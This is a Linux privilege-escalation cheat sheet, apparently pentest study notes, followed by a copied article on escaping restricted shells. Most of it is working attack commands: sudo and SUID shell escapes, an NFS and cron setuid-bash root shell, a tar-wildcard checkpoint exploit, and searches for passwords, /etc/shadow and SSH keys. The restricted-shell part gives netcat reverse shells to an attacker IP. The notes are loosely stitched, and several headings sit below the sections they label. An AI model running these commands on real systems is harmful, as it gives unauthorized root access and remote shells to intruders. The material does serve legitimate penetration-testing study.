# Kernel vulnerability. (exploit suggester or manual based on version)
~~~
1. Uname -a
2. linux-exploit-suggester-2.pl -k <KERNEL_VERSION>
gcc <spoilers> -o exploit -Wl,--hash-style=both
gcc -m32 -Wl,--hash-style=both
~~~
# Suid misconfiguration. Example programs: nmap vim nano 
~~~
Binary with suid permission can be run by anyone, but when they are run they are run as root! 
Nmap example 
Nmap: $ nmap --interactive 
nmap> !sh
~~~
# Search and grep for keywords in all files.
~~~
1. cat ~/.bash_history 
2. cd ~ 
3. grep -Eir "password|secret|sudo|<username>" * | less 
4. cd /etc 
5. grep -Eir "password|secret|sudo|<username>" * | less 
6. cd /home 
7. grep -Eir "password|secret|sudo|<username>" * | less 
8. cd /var/www 
9. grep -Eir "password|secret|sudo|<username>" * | less 
10. find . -type f | xargs grep <SEARCHTERM>
~~~
# Sudo shell escapes.
~~~~~~
sudo -l 
sudo find /bin -name nano -exec /bin/sh \;  
sudo awk 'BEGIN {system("/bin/sh")}'  
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse 
sudo vim -c '!sh'
~~~
# test
~~~
1. Notice the list of programs that can run via sudo 
2. Loof for any of these:  
  - find 
  - awk 
  - nmap 
  - vim 
~~~

If you have any of those proceed to exploit.
======================
1. cat /etc/exports 
2. If “no_root_squash” option is defined for the “/tmp” export (or another export), use this method 

Exploitation  
Kali VM  
1. Open command prompt and type: showmount -e [Linux VM IP Address]  
2. In command prompt type: mkdir /tmp/1  
3. In command prompt type: mount -o rw,vers=2 [Linux VM IP Address]:/tmp /tmp/1  
In command prompt type: echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c  
4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x  
5. In command prompt type: chmod +s /tmp/1/x  
Linux VM  
1. In command prompt type: /tmp/x  
2. In command prompt type: id 

# Exploit misconfigured vulnerable NFS.
http://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
=======================
s -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null 
cron.d 
cron.daily 
cron.deny 
cron.hourly 
cron.monthly 
cron.weekly 
crontab 
 
Linux VM  

1. In command prompt type: cat /etc/crontab  
2. From the output, notice the value of the “PATH” variable 

Exploitation  
Linux VM  

1. In command prompt type: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh  
2. In command prompt type: chmod +x /home/user/overwrite.sh  
3. Wait 1 minute for the Bash script to execute.  
4. In command prompt type: /tmp/bash -p  
5. In command prompt type: id 

# Cron (path) 
Use this if /etc/crontab has a PATH you have write to
==================
Linux VM  

1. In command prompt type: cat /etc/crontab 
2. From the output, notice the script “/usr/local/bin/compress.sh”  
3. In command prompt type: cat /usr/local/bin/compress.sh 
4. From the output, notice the wildcard (*) used by ‘tar’. 

Add checkpoint variables to tar: 

1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh 
2. touch /home/user/--checkpoint=1 
3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh 
4. Wait for script to execute 
5. /tmp/bash -p 
6. id

# Cron ( Tar wildcard) 
Use this if /etc/crontab has a tar command (or other command that has a wildcard)
======================
1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh 
2. Wait for script to execute 
3. /tmp/bash -p 
4. id

# Cron (file overwrite) 
Use this if /etc/crontab has a file that you have write permission to
=======================
dpkg -l | grep -i exim ( is version is below 4.86.2 ?) 

Is exim compiled with perl support? 

exim -bV -v | grep -i perl  

Does exim.conf contain “perl sartup” option? 

Use cve-2016-1531.sh 

# Vulnerable exim.
https://github.com/HackerFantastic/Public/blob/master/exploits/cve-2016-1531.sh
=======================
uname -a 
env 
id 
cat /proc/version 
cat /etc/issue 
cat /etc/passwd 
cat /etc/group 
cat /etc/shadow 
cat /etc/hosts 
grep -vE "nologin" /etc/passwd

# Some manual enumeration within files.
======================
# Debian 
dpkg -l 
 
# CentOS, OpenSuse, Fedora, RHEL 
rpm -qa (CentOS / openSUSE ) 
 
# OpenBSD, FreeBSD 
pkg_info

# Check vulnerable software.
Use searchsploit or exploitdb. Sometimes github has an exploit as well.
======================
http://www.dankalia.com/tutor/01005/0100501004.htm 

# Is there a punctuation ‘.’ mark in the PATH. 
======================
Check all home directories .ssh folders 
ls -la ~/.ssh/ 

find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null |xargs -r

ls -la

# Check for root SSH keys.
=======================
ps aux | grep root 
 
ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'

# View privileged services e.g. root that you might be able to exploit.
========================
# OTHER GUIDES TO CHECK > MANUAL TESTS OR FILE TRANSFER > RUN ENUM SCRIPT ON TARGET MACHINE 
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
========================

# RUN ON LINUX TARGET 

https://github.com/codingo/OSCP-2/blob/master/BASH/CronJobChecker.sh
Cron job checker script that may reveal root cron jobs by checking for newly spawned processes

https://github.com/rebootuser/LinEnum
or
http://pentestmonkey.net/tools/audit/unix-privesc-check
or
https://www.darknet.org.uk/2015/06/unix-privesc-check-unixlinux-user-privilege-escalation-scanner/
Scripted Local Linux Enumeration & Privilege Escalation Checks 

https://github.com/PenturaLabs/Linux_Exploit_Suggester
or
https://github.com/mzet-/linux-exploit-suggester
Linux Exploit Suggester; based on operating system release number 



=================== JAILED SHELLS ############################
SOURCE:
https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ 

Once we have access to a restricted shell, before we can go any further on all techniques, 
the first step is to gather as much information as possible about our current shell environment. 

1.Check available commands either by trying them out by hand, hitting TAB key twice or listing files and directories;
2.Check for commands configured with SUID permissions, specially if they are owned by root user. 
If these commands have escapes, they can be run with root permissions and will be our way out, or in. Oh, you got the point!.
3.Check the list of commands you can use with sudo. This will let us execute commands with other user’s permissions 
by using our own password. This is specially good when configured for commands with escape features.
4.Check what languages are at your disposal, such as python, expect, perl, ruby, etc. They will come in handy later on;
5.Check if redirect operators are available, such as '|' (pipe), “>”, “>>”, “<”;
6.Check for escape characters and execution tags such as: “;” (colon), “&” (background support), “’” (single quotes), 
“” (double-quotes), “$(“ (shell execution tag), “${“

OBS: The easiest way to check for redirect operators, escape characters and execution tags is to use them in commands as arguments 
or part of arguments, and later analyze the output for errors.

If some available command is unknown to you, install them in your own test Linux box and analyze its features, manual, etc. 
Sometimes downloading and inspecting the code itself is a life changer for hidden functions that may not appear in the manual.

Try to determine what kind of shell you are in. This is not easy depending on the configuration in place, 
but can be performed by issuing some commands and checking for general error messages. 
Here are some error message examples from different restricted shells around:

rbash
rksh
rzsh
lshell
Some restricted shells show their names in the error messages, some do not. 

# Methods:
1.Console Editors

Linux systems provide us with different editors such as ed, ne, nano, pico, vim, etc. 
Some of these shells provide third party command execution and file browsing features. 
Editors like “vim” provide us with one of the most well known techniques to bypass shell restrictions. 
Vim has a feature which allow us to run scripts and commands inside it. If vim is available, open it and issue the following command:

:!/bin/ls -l .b*

Vim will get you out of the editor and show the result of the “ls -l .b*” command executed, 
showing all /etc files with names beginning in a letter “b”.

We can use the same technique to execute any other command or even another available shell like bash, 
to avoid our present restrictions, by issuing

:set shell=/bin/sh
:shell

Or

:!/bin/sh

As you can see below we’ve managed to execute /bin/sh shell inside vim, 
now we can execute commands in sh we weren’t allowed to in rbash restricted shell.

Another good example is ed. It is an old default Unix console editor. Generally ed is provided to users 
because it is very simple with not many features that could compromise the system, but still it also has third party command execution 
features inside, very similar to vim.
Once inside ed we can escape the normal shell by executing another one with !’/bin/sh’, as can be seen below:

We managed to get out of lshell and execute commands we were not allowed before.

Another example of editor is ne, which was designed to be a minimal and modern replacement for vi. 
As you can see inside lshell we have no permission to go back to “/” or any other directory above ours.

ne editor has a very interesting feature that allow us to save or load configuration preferences. 
We can abuse this feature to read contents in the file system. With ed opened hit ESC once to reach the main configuration menu. 
Go to the last menu available, “Prefs” to the option “Load Prefs”:

Once clicked it will show us the contents of the file system where we can choose our preferences file from. 
Notice that we now can escalate directories in the file system, even reaching “/” or any other directory, obtaining a read primitive:

We can even open /etc directory files like /etc/passwd to enumerate users:


2.Pager Commands

Linux pagers are simple utilities that allow us to see the output of a particular command or text file, 
that is too big to fit the screen, in a paged way. The most well known are “more” and “less”. 
Pagers also have escape features to execute scripts.

Open a file long enough to fit in more than one screen with any of the pagers above and simply type !’sh’ inside it, as shown below:

As you can see our example using “less” we’ve managed to open a shell inside our pager and execute restricted commands:.

This technique works on both “more” and “less” pagers.

3.man and pinfo Commands

The command “man”, used to display manual pages for Linux commands, also has escape features. Simply use the man command to display 
any command manual, like this:

$ man ls

When the manual for the command ls appears, use the same technique we used for the pagers.

The reason for this to work is due to the fact that “man” uses “less” or “more” as default pagers. 
Other pagers can be used instead to avoid escapes like this.

pinfo is another example of an info command that has escape features. It works just like man.

Let’s use lshell this time for a more realistic example. As you can see in the next picture, 
lshell allows just a few commands by default. The pinfo command was added to the allowed command list just for this example. 
Notice that we’ve tried to issue some commands like “nc”, “/bin/bash” and “ls /etc” directly in the shell but they were all blocked, 
lshell restricted their use:


Let’s open ls manual with pinfo with the following command:

user@kali:~$ pinfo ls

After ls manual page opens, inside pinfo hit “!” (exclamation mark). Notice that this opened a command execution feature, 
now let’s execute some simple commands, such as the previous “ls /etc” that we were not allowed by lshell before, 
and see what we can get:


Notice that we successfully bypassed lshell restrictions executing a restricted command.

Let’s try again but now using a command that is not in the allowed command list, like “nc -h”:

Notice that we managed to run a command that is not allowed by lshell through pinfo.

Now we have everything we need for a real remote shell. Now in our attacker machine (which is configured with IP 192.168.0.21), 
let’s create a listening socket using port 5000 with the following command:

$ nc -lvp 5000
Listening on [0.0.0.0] (family 0, port 5000)

We use pinfo again in our victim machine but this time we are going to issue the command “nc 192.168.0.21 5000 -e /bin/bash” and 
press ENTER. This command will try to start a connection from the victim to our attacker machine on port 5000 and 
throw it’s own /bin/bash shell to it, this technique is known as “Reverse Shell”. 
Remember that this shell is not available in lshell by default but we managed to have access to it bypassing its restrictions:


After hitting ENTER our pinfo screen went black, which means the command was probably executed without errors.

Let’s have a look at our attackers client on port 5000:

We can see a connection coming from our victim. Let’s issue some commands on the attacker side and see what we can get:


As you can see, we successfully bypassed lshell command list restriction executing a connection to our attacker machine and 
sending to it the victim’s /bin/bash shell that we were not allowed to execute before.

Just as a hint, nc is what we call a “Network Swiss Army Knife” and is installed by default in many different Linux distributions. 
It is not unusual for administrators with some security knowledge to uninstall it or enforce restrictions so it can’t be used by 
general users besides root. Another drawback of nc is that the BSD version, if in use, has no -e/-c flags, so we would never be able 
to inject a shell using it.

Another way to get a reverse shell with nc is by adding some creativity and knowledge of Linux operating systems internals with other tools and pipes already provided by Linux systems out of the box.

On the victim’s machine we will execute the following command:

$ rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 192.168.0.21 5000 > /tmp/f”

Analyzing this command in parts (separated by semicolons), the first “rm -f /tmp/f” is used to force delete the “/tmp/f” if it exists. 
The second command “mkfifo /tmp/f” is creating the same file as a fifo file. Fifo (First-In First-Out) is a special type of file, 
similar to a pipe, it can be opened by multiple processes for reading and writing. We are going to use this file as a pipe to exchange 
data between our interactive shell and nc.

The third command “cat /tmp/f | /bin/sh -i 2>&1 | nc -l 192.168.0.21 5000 > /tmp/f” does a lot of things. First it opens the fifo 
file we created then pipe it’s contents to a shell with interactive mode on (/bin/sh -i), also redirecting any error output to the 
standard output (2>&1). Right after that it’s piping all the results, as a reverse shell, to victim nc listening on victim’s IP. 
Now attacker’s machine don’t need to listen to a incoming shell because we made the victim listen for a shell instead. 
Now from the attacker machine we try to connect to the victim on port 5000, and we get our shell.

This kind of FIFO shell is very tricky, very verbose, error prone and little bit harder to run from injected shellcode, 
but it’s yet another option. Remember that this kind of reverse shell technique will only work if the restricted shell allows 
redirect and escape characters.

4.Console Browsers

You might be familiar with some Linux console browsers around, such as “links”, “lynx” and “elinks”. 
Browsers are a very good option for escaping to other commands and shells.

Let’s begin with a very dumb example. Let’s take “links” for instance. After opening any website with a text box, “google.com” 
for example, hit ESC once, that will lead you to the configuration menu. Hit FILE > OS Shell. There you have it! An easy shell.


Another very good example of console browsers is lynx. lynx has a very good feature that lets us edit website content, 
such as text box, using third party editors configured by the user.

After opening lynx and loading any website containing a text box, “google.com” for example, by hitting “o”, lynx will lead us
 to the options page where we can configure an alternative editor:


For this example we have configured “/usr/bin/vim”. Hitting “Accept Changes”, lynx will take us back to Google page. 
Now we move our cursor to the search text box and hit “e” to edit the content with an external editor we configured. 
lynx will take us to vim, from where we can use the same command execution techniques already discussed to get another command or 
even another shell running.

The same editor configuration can be achieved in lynx passing the editor’s absolute path as an argument with the following command:

user@kali:~$ lynx --editor=/usr/bin/vim www.google.com

We still have another console browser to cover, elinks. We can also instruct elinks console browser to use an external editor 
by simply setting $EDITOR variable to reflect the absolute path of some editor, for example:

user@kali:~$ export EDITOR=/usr/bin/vim

Now load any website containing a text box, such as Google Translate, Once the page opens move your cursor to the text box field, 
now press ENTER and then F4 keys. elinks will lead you to vim. Now it is just a matter of reusing vim escape techniques presented 
before.

It’s important to remember that pagers can also be used as editors in console browsers, so you can easily link from one technique 
to the other if necessary. Try it !

5.mutt Command

mutt is a Linux console e-mail reader, and it also has escape features. Simply open mutt and click “!”. This will open command 
execution in mutt. Let’s try to open a shell inside it:

There we have it.

6.find Command

find is a very well known command used to find files in Linux file systems. It has many features, among them an “-exec” one that 
let us execute a shell command. Let’s analyze a very simple example where we use find to look for a non existent file and execute 
a forbidden command:


Notice that we managed to cd to /root directory and also list it’s files. Find is a very interesting command but 
the -exec can only execute commands that are available to the user. Our example will work in rbash, rzsh and rksh shell due to 
the very simple restrictions they have, but it won’t be true for more advanced and configurable shells such as lshell.

7.nmap Command

nmap is probably the most well known port scanner around, and it is used by many security and network professionals around the globe. 
It is very strange and unusual to find nmap allowed in a restricted shell, nonetheless nmap has a very interesting 
option called “--interactive”.

The “--interactive” option was used in nmap versions before May/2009 to open a interactive console where additional commands could 
be run. This function was deactivated in nmap release r17131.

When scanning old Linux server networks, it is still common to find old piece of software installed. 
If you ever encounter an old nmap older than the release above, interactivity can still be used. 
The function can be triggered simply by using “--interactive” as argument. When the interactive console appears, 
simply issue the command “!sh” to open a shell, or any other command you want.

user@kali:~$ nmap --interactive
nmap> !sh
$

# Programming Techniques

Programming languages are great resources for running different commands and other applications to avoid shell restrictions. 
Examples go on and on endlessly due to the nature of programming languages being very complete and full of features. 
Remember that generally programming function calls use special characters like commas, parentheses, semi colons, etc, 
so if the restricted shell in place is not blocking their use, the techniques below will probably work. 
Let’s analyze some very well known examples:

1.awk Command

The awk is an interpreted programming language designed for text processing. It is a standard feature of most unix-like operating systems, that’s why we can generally find them allowed in shells.

It has a lot of functions like print(), sprintf(), and others. Among the most interesting one is system(). The system() function allows us to use /bin/sh to execute a command in the system by using a very simple command line:

$ awk 'BEGIN {system("/bin/sh")}'

Notice that even if we are not allowed to directly run another shell (/bin/sh) inside lshell, we could easily escape its restrictions by using awk to open a shell for us:


2.Expect

Expect is yet another example of language. It’s more of a program that “talks” to other interactive programs according to a script. 
This means we can basically create a script inside expect for it to be run. Also, 
expect has a very interesting function called spawn(). Using spawn() it is possible to drive an interactive shell using 
its interactive job control features. A spawned shell thinks it is running interactively and handles job control as usual.

Let’s execute a simple command in expect instructing it to spawn a /bin/sh shell for us :              

Notice that we were not allowed in lshell to directly execute /bin/sh, nevertheless we successfully 
bypassed that restriction by instructing expect to interactively run /bin/sh.

The same could be accomplished with a more simple command such as:


3.Python

Python is again another very good language to work with. Very flexible and reliable. 
It has a lot of functions we can use to execute commands in shell, such as system(), pty(), and many others. 
Let’s explore a simple example:

We managed to execute the function print() to echo the string “testing”, so it shouldn’t be difficult to execute any other 
command like ls or even a shell. For the first example we are importing the OS module, responsible for OS interaction, 
and finally using system() function to run a forbidden command, cp, just as a proof of concept:

Notice that we successfully run cp command, so it wouldn’t be difficult to run a shell. Let’s do it:

And there we have it. The same example could be applied in a number of different ways, using different functions, like spawn() 
function in pty module, as can be seen below:      

The techniques you can use will only depend on the functions you have at your disposal.

If we want the shell to be available remotely we can use a reverse shell technique instructing python to open a 
socket to our attacker machine, like this:


Checking our attacker machine which is already listening on port 5000:


4.Ruby

The same can be accomplished in ruby. Let’s do a simple example using irb (Interactive Ruby Shell) from where we can directly 
invoke a shell or any other command:


Notice that we successfully again obtained a /bin/sh inside irb.

Another way to accomplish the same thing as a reverse shell is by instructing ruby to open a TCPSocket to our attacker machine, 
and redirecting the interactive shell , like this:


5.Perl

Again another simple example. Let’s use perl with system() method to execute a forbidden command, cp, using /bin/sh as our interpreter:


We managed to execute the command, now shouldn’t be difficult to execute a shell:


And again we did it! Another way to accomplish the same thing is using the exec() method, like this:

We can get a reverse shell by instructing perl to open a socket to our attacker machine, like this:

Checking our attacker machine which is listening on port 5000:

6.PHP

PHP Language has a lot of options to execute commands in a shell, among them the already famous system() and exec(). 
You can either do it interactively inside php console, or directly in command line as we did before in ruby, python and perl.

Here is an example of PHP being used interactively:

Here we managed to run a forbidden command cp. Let’s use now the exec() function to try to execute a interactive shell:

And there we have it. We really don’t need the interactive mode to get a shell in the box. We can simply execute php scripts 
on the command line and make our victim to send us its reverse shell, like this:


Checking our attacker machine which was already listening port 5000:


